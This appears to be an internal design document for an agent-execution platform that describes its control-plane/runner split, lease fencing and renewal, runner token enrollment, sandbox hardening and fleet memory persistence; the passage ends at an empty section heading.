# Runner Fleet — `agentsfleetd` control plane + host-resident `agentsfleet-runner` execution plane

> Parent: [`README.md`](./README.md) · Sibling: [`data_flow.md`](./data_flow.md) (how one event flows through this split).

Date: May 24, 2026 · reconciled to the cutover May 27, 2026
Status: **Implemented (M80_002 cutover).** This is the runtime the codebase runs now: `agentsfleetd` is the control plane, the host-resident `agentsfleet-runner` daemon is the execution plane, and the old single-process `agentsfleetd worker` + standalone sandbox sidecar are deleted. [`data_flow.md`](./data_flow.md) traces an event through it; this file is the structural picture.

Read this when a spec touches the `agentsfleet-runner` binary, the `/v1/runners` control protocol, runner registration, the node fleet, or assignment / fencing / reclaim.

---

## System guarantees (read this first)

The runner fleet is an **execution plane**: stateless runners lease work, run it in a sandbox, and report back. The control plane (`agentsfleetd`) owns all durable state. Everything below is a consequence of that one decision — read the guarantees before the mechanics, because the mechanics only exist to hold these.

| Guarantee | What the platform promises | How it holds |
|---|---|---|
| **No event loss on runner death** | A runner that crashes, partitions, or is killed mid-event never drops the event. | The lease has a `lease_expires_at`; the reclaim sweep re-leases an expired lease to another runner. Durability is at-least-once via `core.fleet_events` + `INSERT … ON CONFLICT DO NOTHING`. |
| **At-most-once durable effect** | A reclaimed or duplicate runner cannot double-write state. | Every lease carries a monotonic `fencing_token`; `report` verifies it in the same atomic statement that flips the lease to `reported`. A stale holder's report is rejected (`UZ-RUN-005`). |
| **Secrets never leave the trust boundary** | Tenant credentials are never written to a runner's disk, logs, or cache. | `secrets_map` rides the lease inline over Transport Layer Security (TLS), is used only at the tool bridge inside the sandboxed child, and is never persisted runner-side. |
| **Execution is always sandboxed** | No leased event ever runs un-isolated. | Each lease forks a child under Landlock + cgroups + a network namespace; a sandbox-setup failure fails **closed** — the child does not start, the runner reports `UZ-RUN-007`, and the lease is redeliverable. |
| **The runner holds no datastore credentials** | A compromised or untrusted host cannot reach Postgres, Redis, or the Vault. | `build_runner.zig` links no `pg` / `httpz` / `redis`; the only platform surface the runner reaches is the authenticated `/v1/runners` protocol carrying a `agt_r` token. |

### Runners are cattle, not pets

A runner has no durable identity that the system depends on. It is enrolled once by the operator, then leases, runs, reports, and may vanish at any moment; the control plane notices via lease expiry and hands the work to whichever runner leases next. There is no runner the fleet cannot lose. Sticky routing (below) is a *performance hint*, never ownership — correctness never blocks on one runner being alive.

## Failure recovery model

Recovery latency is **emergent from fleet polling density**, not a hard bound — a dead runner's work is picked up when its lease expires and another runner next leases. The current Service Level Agreement (SLA) is the S0 floor; tightening it is the M80_006 mandate, not optional polish.

| Failure | SLA today (S0) | Mechanism | Tradeoff | M80_006 path |
|---|---|---|---|---|
| Runner dies mid-lease | work resumes within ~`LEASE_TTL_MS` (30 s) + next lease latency | lease expiry + reclaim sweep re-leases with a higher fencing token | recovery latency is lazy (tied to the TTL), not push-driven | heartbeat-detected death → proactive reassignment; sub-10 s recovery |
| Stale report after reclaim | immediate | `report` CAS verifies `fencing_token`; stale holder rejected (`UZ-RUN-005`) | the redone work by the new holder is the authority; the slow holder's compute is wasted | unchanged — fencing is the durable guard |
| **Fleet outruns the lease TTL** | resolved (§3) — a live child renews its own lease | the runner auto-renews through the fenced `/renew` verb while the child is genuinely active (a progress frame, or a synthetic keepalive during a quiet-but-in-flight model call); liveness is decoupled from execution duration, bounded by a hard `MAX_RUNTIME_MS` cap | a child that stops emitting is **not** renewed — it expires at its deadline and is reclaimed + re-run; never double-run (fencing) | **shipped**; §1 cordon-drain + §2 heartbeat-lapse reassignment build on top |
| Sandbox setup fails | immediate | child never starts; runner reports `fleet_error` (`UZ-RUN-007`); lease redeliverable | a host with a broken sandbox burns one lease attempt before the operator cordons it | cordon / reaping of hosts that repeatedly fail to establish a sandbox |
| Control plane unreachable | bounded by runner backoff | runner retries with backoff; the un-acked lease redelivers | a runner that can't reach `agentsfleetd` does no work until the link returns | unchanged — the runner is the reconnect handler |
| Assignment errors *after* winning a fleet's slot | next poll (~immediate) | `tryCandidate` releases the won `runner_affinity` slot before the error propagates — on the reclaim probe and on the fresh-envelope build alike — and logs `post_claim_error_released{stage}`. A release that itself fails degrades to the slot's own `leased_until` expiry | one poll is burned; the slot is not held for a full `LEASE_TTL_MS` on a transient database or allocation failure | unchanged — the release is token-guarded, so it can never free a *newer* holder's claim |

> **The renewal gap is closed (§3).** A live child renews its lease through the fenced `/renew` verb before `lease_expires_at`, so execution duration is decoupled from `LEASE_TTL_MS` — which stays short (single-sourced in `src/lib/common/constants.zig`) as the silent-death backstop, *not* as the cap on how long a Fleet may run. Renewal is credit-gated and bounded by a hard `MAX_RUNTIME_MS` cap; a child that stops emitting is not renewed and is reclaimed at its deadline. The runner can now default for fleets that run well past the TTL.

### Per-lease renewal — how a long fleet keeps its lease

A renewal pushes the kill-deadline forward *only while the child is genuinely working*. The runner's supervisor wakes on a fixed tick; once inside the renewal window it calls `/renew`, which atomically extends **both** the lease row and the affinity slot under a fence + the hard cap:

```
 lease issued                                renewal window
 (expires = now + LEASE_TTL_MS)              (RENEWAL_WINDOW_MS before expiry)
   │            tick    tick    tick    tick ▼ tick
   ●────────────●───────●───────●───────●────●──────────────────►
                                              │ < window? → POST /renew
                                              ▼
   server, in ONE fenced atomic statement:
     • still the fencing holder?  no → 409 lease_lost  → runner kills child
     • credits cover the run?     no → 402 no_credits  → terminate
     • past created_at+MAX_RUNTIME_MS? yes → 409 max_runtime → terminate + report
     • else → extend lease_expires_at AND affinity.leased_until to
              min(now+LEASE_TTL_MS, created_at+MAX_RUNTIME_MS); bump last_seen_at
                                              │
   ┌──────────────────────────────────────────┴───────────────────────────────┐
   │ The tick on a live-but-quiet child IS the synthetic keepalive — a long     │
   │ model call with no progress frames still renews. A truly dead/dormant      │
   │ child emits nothing, is never renewed, and is reclaimed at the deadline.   │
   │ The renewal doubles as the runner's heartbeat (it is single-threaded and   │
   │ does not heartbeat mid-run), so §2 lapse-detection never reassigns a live  │
   │ long-runner's own lease.                                                   │
   └────────────────────────────────────────────────────────────────────────────┘
```

Fail-safe by construction: a transient `/renew` failure retries on the next tick (the window leaves slack); if it cannot renew by the deadline the child is killed and the event reclaimed + redone elsewhere — never double-run.

## Scope — an execution plane, deliberately not a control plane

The fleet borrows Kubernetes / Nomad / Temporal **semantics** — leases, fencing, node heartbeats, drain, sticky scheduling, checkpointed workloads — but it is **not** a general orchestrator and must not drift into one. The non-goals are load-bearing; each rejected feature is one we deliberately do not build until a spec changes this direction:

- **Not a general scheduler — beyond label placement.** **Label** placement (a fleet's `required_tags ⊆ runner.labels`, matched before the sticky hint) landed in **M85_001** (live: `assign.zig` matches `required_tags <@ labels`); capacity / fairness / autoscale stay out of scope. (The earlier "M80_007" reservation for this was a stale ID — M80_007 shipped as the runner-observability spec.)
- **No autoscale.** Runners scale by operators adding hosts, not by the platform reacting to queue depth.
- **No fairness engine.** No per-tenant weighting, no priority lanes, no preemption.
- **No arbitrary workload types.** One workload: a NullClaw run from a leased `ExecutionPolicy`.

Without this fence the design rediscovers three control planes at once (Nomad-lite + Temporal-lite + Kubernetes-lite), each demanding its own observability, reconciliation, and high-availability story. The distributed-systems core here is sound; the risk is scope, not correctness. If the platform ever needs a true control plane, that is a larger upfront conversation (inventory / reconciliation / high-availability / placement fairness) — surface it, don't drift into it.

---

## Why split

The pre-cutover runtime ran one `agentsfleetd` binary as `serve` (the HTTP API) or `worker` (the orchestration loop), plus a standalone sandbox sidecar that owned sandboxing. Two facts made it impossible to run work on hosts the platform does not fully own:

1. **The worker was welded to the datastores.** Each per-fleet worker thread opened its own Postgres pool and Redis connections, ran ~15 write patterns on the per-event hot path, and discovered its own work by `XREADGROUP` on `fleet:{id}:events`. It could not run anywhere it could not reach Postgres and Redis directly.
2. **The connection budget grew with the fleet.** Every per-fleet thread held a dedicated blocking Redis connection; the fleet count was capped by the Redis pool ceiling, not by compute.

The cutover moved execution onto arbitrary hosts (bare metal, a Mac, a pod) that hold **no datastore credentials**, reaching the platform only over the authenticated `/v1/runners` protocol.

## The split — two binaries, no sidecar

- **`agentsfleetd`** — the control plane. Owns Postgres, Redis, the Vault API, the HTTP API, and work assignment / fencing / reclaim. It gained the `/v1/runners` endpoints and does the `XREADGROUP` / `XACK` the worker used to do.
- **`agentsfleet-runner`** — the host-resident execution plane. It is the parent control loop **plus the NullClaw execution engine linked in directly** (the old standalone sandbox sidecar is gone). It holds zero datastore credentials and talks to `agentsfleetd` only over Hypertext Transfer Protocol Secure (HTTPS), carrying a `runner_token`.

```
        BEFORE (deleted)                            NOW (this doc + data_flow.md)
 ┌──────── ONE TRUST ZONE ─────────┐    ┌─ PLATFORM ──┐      ┌─ HOST (bare metal / Mac / pod) ─┐
 │ agentsfleetd serve ─┐  PG, Vault      │    │ agentsfleetd     │      │ agentsfleet-runner  (one binary)     │
 │                ▼                 │    │ control     │◀────▶│  parent loop: heartbeat,        │
 │ PG ◀─ 15 writes ─ agentsfleetd worker │    │ plane:      │HTTPS │  lease, report, activity        │
 │ Redis ◀─ XREADGROUP ─ worker     │    │ owns PG +   │ pull │  (boots from pre-minted agt_r)   │
 │                │ Unix-socket RPC │    │ Redis +     │ agt_r │    │ fork + sandbox per event    │
 │                ▼                 │    │ Vault API + │      │    ▼                            │
 │           sandbox sidecar        │    │ assignment  │      │  sandboxed child: NullClaw      │
 └──────────────────────────────────┘   └──────┬──────┘      └─────────────────────────────────┘
                                          PG · Redis · Vault
                                          (never leave the platform)
```

**Why the engine folds in but still forks.** NullClaw runs the fleet: language-model calls plus tool calls, with tenant secrets substituted at the tool bridge. It needs a sandbox — Landlock (filesystem) + cgroups (memory/CPU) + a network namespace. Landlock is one-way and irreversible for a process, and the `agentsfleet-runner` parent loop needs un-sandboxed network to reach `agentsfleetd`. So the runner **forks a sandboxed child per event** and talks to it over a local pipe. One binary, two process roles: an un-sandboxed parent that speaks the control protocol, and a sandboxed child that runs NullClaw. There is no separate daemon to deploy.

### Where the code lives

The directory layout makes the "runner holds zero datastore credentials" guarantee **structural and grep-visible**, not merely enforced by `build_runner.zig`'s import list. The control plane and the execution plane never share a source tree; the only surface both reach is the frozen wire protocol, consumed as a named Zig module (`@import("contract")`) so neither build graph reaches into the other's source.

| Layer | Path | Build graph | Links | Role |
|---|---|---|---|---|
| `contract` | `src/lib/contract/` | both (named module) | none | frozen `/v1/runners` wire types — `protocol`, `event_envelope`, `execution_policy`, `execution_result`, `activity` |
| `common` | `src/lib/common/` | both (named module) | none | single-source knobs both planes key off (`LEASE_TTL_MS`, …) |
| `logging` | `src/lib/logging/` | both (named module) | none | shared logfmt scope helpers |
| control plane | `src/agentsfleetd/fleet/` | `agentsfleetd` (`build.zig`) | `pg`, `redis` | `assign` / `affinity` / `reclaim` / `service` / `service_report` / `service_activity` — lease / fence / reclaim / assignment |
| runner daemon | `src/runner/daemon/`, `src/runner/{main,child_supervisor,child_exec,sandbox_args,pipe_proto}.zig` | `agentsfleet-runner` (`build_runner.zig`) | none | runner-side process; imports nothing from `src/agentsfleetd` |
| runner engine | `src/runner/engine/` | `agentsfleet-runner` | none (NullClaw base) | the folded-in NullClaw engine + sandbox glue (`cgroup`, `landlock`, `network`) |

The control-plane handlers under `src/agentsfleetd/fleet/` are faithful mirrors of the deleted worker's `event_loop_writepath` steps — the comments there name their origin so the row-equivalence guarantee (below) is auditable.

## The control protocol — `/v1/runners`

Five verbs. `agentsfleetd` translates them into the Postgres writes and Redis stream operations the worker did directly, so the runner never sees a datastore.

| Verb | Path | Auth | Handler | Purpose |
|---|---|---|---|---|
| `register` | `POST /v1/runners` | `Bearer` Clerk JWT carrying `platform_admin` | `runner/register.zig` | platform admin mints a durable `runner_token` (`agt_r`) for a host; record `host_id`, `sandbox_tier`, `labels`. Tenant `admin` JWT / `agt_t` api_key → `403`. Called from the **dashboard "Add runner"** (a session-authed server action) — **not** the runner CLI, and never the host. The operator installs the once-revealed `agt_r` (M84_001) |
| `heartbeat` | `POST /v1/runners/me/heartbeats` | `Bearer agt_r` | `runner/heartbeat.zig` | liveness; reply carries `status` (`ok` / `drain` / `stop`) and any revoked lease IDs |
| `lease` | `POST /v1/runners/me/leases` | `Bearer agt_r` | `runner/lease.zig` | long-poll for the next event; reply carries the event, resolved config, secrets, `lease_id`, `fencing_token` — or `null` + `retry_after_ms` |
| `report` | `POST /v1/runners/me/reports` | `Bearer agt_r` | `runner/report.zig` | terminal result for a lease; `agentsfleetd` persists + `XACK`s after a fencing check |
| `activity` | `POST /v1/runners/me/leases/{lease_id}/activity` | `Bearer agt_r` | `runner/activity.zig` | write-only progress stream for the live tail; best-effort, no ack |

`me` resolves from the token — no `runner_id` in any path or body, so there is nothing to spoof or reconcile. `register` is the one verb authed by a *human operator* credential; everything else is authed by the machine credential it mints. Identity and auth are covered in [`../AUTH.md`](../AUTH.md) (the runner is the first machine principal). `register` is gated by the `platform_admin` claim — only agentsfleet's platform operator may enroll a host into the shared fleet — so a tenant `admin` JWT or a `agt_t` api_key is rejected `403`.

## Registering a runner

A runner needs a `agt_r` token before it can pull work. The **platform admin pre-mints it from the dashboard** and installs it on the host — the host never self-registers (Option B, the GitLab-16 "create runner → authentication token" model). The admin opens **dashboard → Admin → Runners → "Add runner"**; a session-authed server action calls `POST /v1/runners`; `agentsfleetd` mints the `agt_r` and reveals it **once** (copy-to-clipboard, then dropped from the browser), and the admin drops it into the host's vault / `AGENTSFLEET_RUNNER_TOKEN` env var. No identity credential ever touches a shell (M84_001 retired the `register --token` CLI). On boot the daemon validates the `agt_r` prefix (fail-loud, not a silent 401 loop) and goes straight to the heartbeat/lease loop — no register call, so no host ever holds an enrollment-grade credential. There is no enrollment token; the minter must hold `platform_admin`. The open-fleet, self-enrolling case is mode C, later.

```
 platform admin                                          agentsfleetd
 (dashboard session; metadata.platform_admin=true)
   │ "Add runner" server action → POST /v1/runners   🔒 GATE 1 — who may enroll:
   │   Authorization: Bearer <session-JWT>           platform_admin claim required
   │   { host_id, sandbox_tier, labels[] }           (tenant admin / agt_t → 403)
   ├────────────────────────────────────────────────►│ mint agt_r (256-bit random)
   │                                                  │ store sha256(agt_r) + last_seen_at=0 in fleet.runners
   │◀──────────────────────────────────────────────────┤ 201 { runner_id, runner_token: agt_r }  (revealed once)
   │ admin installs agt_r on the host (vault → env AGENTSFLEET_RUNNER_TOKEN)
   ▼
 host: agentsfleet-runner
 (env AGENTSFLEET_API_URL + AGENTSFLEET_RUNNER_TOKEN=agt_r…)
   │ boot: validate agt_r prefix, NO register call
   │ steady loop — Authorization: Bearer agt_r         🔒 GATE 2 — per-call auth:
   │      ◀── heartbeat · lease · report · activity ─┤ sha256(Bearer) == token_hash (timing-safe)
   │      eligibility: sandbox_tier + scope + secret_delivery   🔒 GATE 3 — blast radius
```

`agentsfleetd` owns the Postgres pool, the Redis pool, and the Vault API; `agentsfleet-runner` owns none of them and holds only the `agt_r` token. Rotating a token swaps `token_hash`; revoking sets `admin_state='revoked'` (M84_002) so the next call gets a 401. The runner's env is `AGENTSFLEET_API_URL` + `AGENTSFLEET_RUNNER_TOKEN` (matching the `agentsfleetd` / `agentsfleet` convention), and `AGENTSFLEET_RUNNER_TOKEN` holds the minted `agt_r` directly — there is no bootstrap credential on the host and no datastore secret.

## Runner state — three categories, no JSONB status

A runner's "status" is three *separate* concerns; conflating them into one Kubernetes-style `status` JSONB object is the trap we deliberately avoid (cross-validated Jun 2026). Kubernetes needs `status.conditions[]` because dozens of controllers write orthogonal state onto one object; the fleet has one operator-intent dimension and a simple pull/lease loop, so typed columns + an event log stay clearer and queryable.

| Category | Where it lives | Examples | Stored? |
|---|---|---|---|
| **Operator intent** | `fleet.runners.admin_state` (typed enum) | `active` · `cordoned` · `draining` · `drained` · `revoked` | **yes** — and `admin_state != 'active'` is the cordon/revoke auth gate (M84_002) |
| **Runtime liveness** | **derived** at read from `last_seen_at` + leases | `registered` · `online` · `busy` · `offline` | **no** — a pure function; storing it would drift |
| **History** | `fleet.runner_events` (append-only) | `runner_registered` · `lease_acquired` · `runner_offline` · `runner_revoked` | **yes** — answers "last busy?", "runs this period", "offline how long?" |

Liveness is honest because **mint stores `last_seen_at = 0`** (the never-connected sentinel): a freshly-minted runner reads **registered**, not a fake **online**, until its first heartbeat moves `last_seen_at` forward (M84_001). "Auth failed" is *not* a runner state — identity is the token, so a bad `agt_r` matches no row; it surfaces in logs/metrics, never as a row's liveness. The `phase + conditions JSONB` split is adopted **only if** many independent subsystems ever write runner conditions (health probes, maintenance, capacity, security) — not before.

### Operator plane + reassignment

The read of the fleet — `GET /v1/fleets/runners` (paginated, platform-admin-gated, derived liveness, no `token_hash`) — landed in **M84_001**. The **mutation** half — `PATCH /v1/fleets/runners/{id}` cordon/drain/revoke, the `status`→`admin_state` rename, `UZ-RUN-009`, the `fleet.runner_events` log, and the **liveness sweeper** that marks stale runners offline and expires affinity for admin-driven reassignment — landed in **M84_002**. "Busy" stays **derived** from `fleet.runner_leases` — a runner holds **0..N** active leases under the M88_002 worker pool, so there is no singular live-lease column: `busy = EXISTS(active lease)` and `active = COUNT(active)` derive server-side, and reassignment targets a specific lease row. Capacity-aware scheduling (`available = worker_count − active`) stays out of scope (M85_001 shipped label placement only, not capacity) because no runner-reported `worker_count` exists today. Heartbeat-lapse recovery remains bounded by the lease-expiry backstop first; M84_002 adds the offline audit event and admin-driven affinity expiry.

## Datastore role model — why there is no `runner_runtime`

Access to the runner-domain tables (`fleet.runners`, `fleet.runner_leases`, `fleet.runner_affinity`) is governed at **two independent layers**. Conflating them is the recurring design error — the temptation to mint a `runner_runtime` database role "so the runner tables have an owner" collapses an authorization rule onto an authentication identity.

| Layer | Mechanism | Answers | Enforced where |
|-------|-----------|---------|----------------|
| **App authorization** | `platform_admin` JSON Web Token (JWT) claim | *Which API caller* may enroll / list / manage runners | request handlers (`src/agentsfleetd/auth/claims.zig`) |
| **Datastore identity** | `api_runtime` Postgres role | *Which process identity* writes the rows | Postgres `GRANT` |

```
   caller (Clerk JWT, platform_admin=true)            runner (agt_r token, NO db creds)
        │  GET/POST /v1/fleet, /v1/runners                  │  POST /v1/runners/me/leases
        ▼                                                   ▼
   ┌──────────────────────────────────────────────────────────────────┐
   │ agentsfleetd                                                            │
   │   Layer 1 — claim check: is caller platform_admin?  (admin routes) │
   │   Layer 2 — writes fleet.* connecting to PG as api_runtime         │
   └───────────────────────────────────┬────────────────────────────────┘
                                        ▼
            fleet.runners · fleet.runner_leases · fleet.runner_affinity
            GRANT SELECT, INSERT, UPDATE … TO api_runtime   (schema 021/022/023)
            — no worker_runtime grant, no runner_runtime role —
```

Three load-bearing facts:

1. **The runner never authenticates to Postgres.** It holds zero datastore credentials and reaches the platform only over `/v1/runners`. `agentsfleetd` writes every `fleet.*` row *on the runner's behalf*, connecting as `api_runtime`. Schema files `021`/`022`/`023` grant the fleet tables to `api_runtime` only — the newest tables in the system never even mention `worker_runtime`, which is dead substrate removed wholesale in the worker-substrate retirement workstream.
2. **`platform_admin` is not a Postgres role — it is an auth claim.** "platform_admin has access to the runner tables" is an *API-authorization* statement, already satisfied at Layer 1 (it gates `register` and the fleet-management routes). It is not, and must not become, a database `GRANT`.
3. **Therefore there is no `runner_runtime` role, and there must never be one.** A `runner_*`-named datastore role would assert that the runner connects to the datastore — exactly the guarantee this fleet is built to deny. (An in-PR `worker_runtime`→`runner_runtime` rename was rejected for this reason; removal, not rename, is the correct direction.)

If connection-level isolation of the fleet write path is ever warranted, that is a **control-plane** role — name it `fleet_runtime`, back it with its own pool, and justify it with a real threat model that treats the fleet writes as a distinct compromise surface. It is never a runner-named role, and it stays out of scope while `agentsfleetd` runs a single write pool: a second role with no second pool or code path is the dead-role anti-pattern the role-consolidation work exists to eliminate.

## Running one event (NullClaw)

A `lease` reply is the runner's entire input for an event. The runner forks a sandboxed child, the child runs NullClaw, and the result goes back via `report`.

```
lease → { event, ExecutionPolicy(config + secrets_map + network_policy + tool_allowlist),
          instructions, lease_id, fencing_token, checkpoint?, bundle_manifest? }
   (`instructions` = the installed fleet's SKILL.md body, extracted server-side by
    FleetSession; the runner composes the NullClaw turn from instructions + event so
    the installed behaviour runs on every trigger. Soft reasoning input, never a secret
    — provider key + secrets_map stay in ExecutionPolicy / the tool bridge. M84_008.)
   (`bundle_manifest` appears only for fleets installed from Fleet Bundles. It carries
    immutable snapshot metadata and support-file paths, never resolved credentials.)
   │
agentsfleet-runner parent (child_supervisor.zig): establish the cgroup, fork, exec self as
   `agentsfleet-runner __execute` under bwrap (unshare-all + ro-system + rw-workspace),
   materialize bundle support files into the lease workspace when present, feed the lease over
   the child's stdin, read framed frames off its stdout under the lease deadline
   │
   └─ sandboxed child (child_exec.zig): apply mandatory Landlock, build config + tool set from
      the policy, run the NullClaw turn — language-model calls + tool calls, secrets substituted
      at the tool bridge — emit activity frames + the final result over stdout
   │
report → agentsfleetd: persist terminal state + telemetry + checkpoint, then XACK
```

The pre-cutover TOCTOU (Time-Of-Check-To-Time-Of-Use) guards — lease re-check before a run, orphan reaping, idempotent destroy — moved inside the runner as parent↔child supervision: the parent reaps orphan-safe, kills the cgroup tree on a deadline overrun, and `destroy()`s idempotently. The durable lease guard lives in `agentsfleetd` via `lease_expires_at` + `fencing_token` (see **Reclaim** below). The fork model is **fork-then-exec-self under bwrap**: bwrap owns the unprivileged user/network-namespace dance (raw `unshare` needs privilege) and gives the child a clean address space.

Fleet Bundle support files are mounted as workspace files, not pasted into the model prompt.
`SKILL.md` may instruct the fleet to read `SOUL.md`, `ZOHO.md`, scripts, examples, or assets,
but those files do not grant tools, network, or secrets by themselves. A missing or corrupt
bundle snapshot is a startup failure before the model is invoked.

### Process-boundary hardening

bwrap (namespaces) + Landlock (filesystem) + cgroup (kill/limit) are the headline layers, but the **process boundary underneath them** carries its own guarantees — what the child inherits across `fork`/`exec`, and how its tree is reaped. These sit below the namespace/LSM layer and close paths that the isolation layers do not:

- **Filtered environment.** `AGENTSFLEET_RUNNER_TOKEN` (the daemon's control-plane credential) and every other daemon-only var live in the *parent's* environment. The child is spawned with a **fail-closed allowlist** `environ_map` (`HOME`, `PATH`, the engine's optional knobs, the TLS CA path) — it inherits only what tool execution needs, never the `AGENTSFLEET_`/`RUNNER_` namespace. A prompt-injected fleet reading its own `/proc/self/environ` or calling `getenv` finds the token structurally absent. (The cross-process `/proc/<daemon>/environ` read is already shut by the pid namespace.) Lease secrets still ride **stdin**, never argv/env.
- **No privilege escalation.** The child sets `PR_SET_NO_NEW_PRIVS` before `landlock_restrict_self`, so a setuid binary in the read-only system mounts can never raise privilege. It is additive — it does not remove the user-namespace `CAP_SYS_ADMIN` that Landlock currently rides.
- **No controlling terminal.** `--new-session` detaches the child from any tty, closing terminal-input injection (`TIOCSTI`).
- **Absolute `argv[0]`.** The exec target is asserted absolute before spawn, so a child program is never resolved through the parent's `$PATH`.
- **Un-emptyable kill domain.** The cgroup is the primary atomic kill domain, but the parent **always also** signals the child's process group, and **fails the lease closed** if cgroup enrollment fails (otherwise the child would run unmetered in the daemon's cgroup and a kill on the empty exec-cgroup would reap nothing). A forking fleet's whole tree dies on revocation/timeout.

The first four make the daemon's own credentials and host privileges unreachable from inside a hostile fleet; the last makes containment escape-proof against a child that forks to survive. Network egress is the orthogonal layer — see the egress model below.

### Multi-run events

A *run* is one NullClaw execution inside one language-model context window. When a single event needs more reasoning than one window holds, NullClaw stops at `stage_chunk_threshold` (0.75 of the context cap), checkpoints, and signals "resume me." `agentsfleetd` enqueues a **continuation event** chained by `resumes_event_id`, and the next lease resumes from the checkpoint in a fresh window. One lease = one run.

```
trigger event E0 ─► RUN 1 (lease, checkpoint=∅) ─► NullClaw hits 0.75 cap ─► report{continue, C1}
                                                          │ agentsfleetd persists checkpoint C1,
                                                          │ enqueues continuation (resumes_event_id=E0)
                ─► RUN 2 (lease, checkpoint=C1) ─► … ─► report{continue, C2}
                ─► RUN 3 (lease, checkpoint=C2) ─► NullClaw finishes ─► report{processed}
```

Durable state across runs is the checkpoint in `agentsfleetd`, never runner-local — which is why a different runner can pick up run 2. There is no continuation-chain cap; a runaway run is bounded by the fleet's `budget` caps and the lease runtime deadline instead. Sticky routing (below) prefers the runner that ran the previous run, but correctness never depends on it.

## Memory continuity — durable fleet memory rides the trusted plane

Memory is the **second** kind of cross-run state, and it obeys the same law as the checkpoint above: **durable fleet memory lives only in `agentsfleetd`'s Postgres, never in the runner and never in the fleet.** The checkpoint carries *run-continuity* (where a chunked incident left off); memory carries the *fleet's learned knowledge* — the `memory_store` / `memory_recall` durable scratchpad. Both are hydrated into a run and captured out of it; neither is ever runner-local-durable.

The sandboxed child holds **no** `agt_r` token, **no** control-plane URL, and **no** Data Source Name (DSN) — so a prompt-injected fleet cannot be talked into "reach your memory endpoint": none exists inside it. The fleet's in-run working store is **SQLite in `:memory:` mode** (no on-disk file). Durability is the parent's job, over the same `agt_r` `/v1/runners` plane that already carries leases and reports — two endpoints, both fencing-verified like `/reports`:

| Verb | Path | Direction | What |
|------|------|-----------|------|
| `GET`  | `/v1/runners/me/memory/{fleet_id}` | hydrate (control plane → parent → child) | the parent fetches a **category-pinned hydration window** of that lease's fleet's prior memory and seeds the child's `:memory:` store at run start: every `core` entry that fits the byte budget hydrates before any non-core entry is considered, the remaining budget fills with the newest non-core entries, and the cold tail stays durable in Postgres. The fleet is named by the lease's `fleet_id` (M84_005), so resolution does **not** depend on a single live lease — a pooled runner (M88_002) holding N leases hydrates each fleet independently |
| `POST` | `/v1/runners/me/memory/{fleet_id}` | capture (child → parent → control plane) | the parent pushes the run's memory (`lease_id` + `fencing_token` in the body, like `report`, to fence the write); `agentsfleetd` persists it under `SET ROLE memory_runtime` (the same datastore role the tenant memory write uses) |

```
        ┌──────────────── CONTROL PLANE (agentsfleetd) ─────────────────┐
        │  Postgres · memory.memory_entries  ← ONLY durable store    │
        │  written under SET ROLE memory_runtime (datastore role)    │
        └──────────▲───────────────────────────────▲────────────────┘
          GET /v1/runners/me/memory/{id}   POST /v1/runners/me/memory/{id}
          (hydrate prior memory)         (capture run memory)
          [agt_r + fencing]               [agt_r + fencing]
                   │                             │
        ┌──────────┴─────────────────────────────┴────────────┐
        │  agentsfleet-runner PARENT (trusted) — holds the agt_r      │
        └──────────┬─────────────────────────────▲────────────┘
            pipe ↓ prior memory (stdin)     pipe ↑ memory frame (stdout)
        ╔══════════▼═════════════════════════════╧════════════╗  ← SANDBOX
        ║  sandboxed child (NullClaw) — NO token, URL, or DSN  ║     BOUNDARY
        ║  in-run store = SQLite :memory:  (no disk file)      ║
        ║  fleet calls memory_recall() / memory_store()        ║
        ╚══════════════════════════════════════════════════════╝
```

**The carry-over — one fleet, two runs:**

```
RUN 1  (first ever for fleet A)
  lease{ fleet=A, fence=7 } → runner parent
  parent ─GET /me/memory─►  []                 (empty: nothing stored yet)
  parent ─pipe─►  child seeds an EMPTY :memory: store
  fleet:  memory_store("todo", "step 3 of 5"),  memory_store("prefs", …)
  run-end  +  every memory_checkpoint_every:
     runner lists its :memory: store → deltas ─pipe─► parent
     parent ─POST /me/memory─►  agentsfleetd INSERTs rows   (fleet_id = A)
  child exits → :memory: store vanishes (no disk artifact)

  Postgres now holds:   A · todo · "step 3 of 5"    |    A · prefs · …

RUN 2  (next run, same fleet A)                          ◄── THE CARRY-OVER
  lease{ fleet=A, fence=8 } → runner parent
  parent ─GET /me/memory─►  [todo, prefs]      (run 1's memory)
  parent ─pipe─►  child seeds :memory: WITH those entries
  fleet:  memory_recall("todo") → "step 3 of 5"   → continues from step 3
          memory_store("todo", "step 5 of 5")     (same key → UPDATE)
  push → agentsfleetd UPDATEs (todo, A) + INSERTs any new keys (idempotent)
```

**Data model.** Scope is the **fleet**, not the workspace: the durable scope column is **`fleet_id`** (the legacy NullClaw `instance_id` name is retired — `schema/013`), derived **server-side** from the lease `agentsfleetd` issued — a client-supplied scope is ignored. Within a fleet each `key` is one row; re-storing a key is `ON CONFLICT (key, fleet_id) DO UPDATE`, so a retried or duplicate push is idempotent. The workspace is the *authorization* boundary above this (a tenant must own the fleet to read its memory via the tenant `GET`); two fleets never share a memory namespace. Canonical scope reference: [`memory.md`](./memory.md).

**Multi-lease isolation invariant.** Concurrent-lease safety (M88_002's worker pool) rests on the per-fleet **affinity slot admitting a single live holder** — `uq_runner_affinity_fleet_id UNIQUE(fleet_id)` + the `leased_until < now` time-gate — plus **capture-time `fencing_token`** rejecting a stale holder. (It is *not* a unique constraint on `fleet.runner_leases`; multiple lease rows per fleet are normal, and a slow old holder can transiently coexist with a reclaimer — which is *why* fencing exists: only one writer durably persists into a fleet's namespace.) So a runner's N concurrent leases are always N *distinct* fleets = N distinct namespaces. Isolation does **not** rest on `fleet_id` scoping alone: a future retry / speculative / failover / takeover-lease feature that broke the single-live-holder property would have to scope memory by `lease_id` first. Keep this invariant load-bearing.

**Cadence.** The parent pushes at **run end** (mandatory) and **mid-run** on the existing `memory_checkpoint_every` cadence, so a long run's learned memory is durable before the run finishes — a crash loses at most the work since the last checkpoint push. Because the run-end push lands before `report`, a continuation run (above) hydrates the snapshot the previous run just stored.

**Selection policy.** Hydration is a deterministic, category-pinned byte window — a pure function of (rows, budget): the `core` tier is pinned (every `core` entry, newest-first, within the byte budget), then the newest non-core entries fill the remainder; unknown and custom categories are windowed, never silently pinned. Cap eviction orders the same way — the coldest non-core rows are evicted first, and a `core` row is evicted only when no non-core row remains — so a fact stored once as `core` survives both the window and the cap. No search infrastructure, no scoring: the fleet's own discipline (stable keys, `core` for load-bearing facts, `memory_forget` for stale entries — see [*capabilities.md*](./capabilities.md) §4 memory hygiene) is the primary bound. A dedicated, scalable memory store remains the post-launch direction; the `GET` endpoint is the seam it swaps in behind, with no change to the fleet.

## Live activity (the SSE tail)

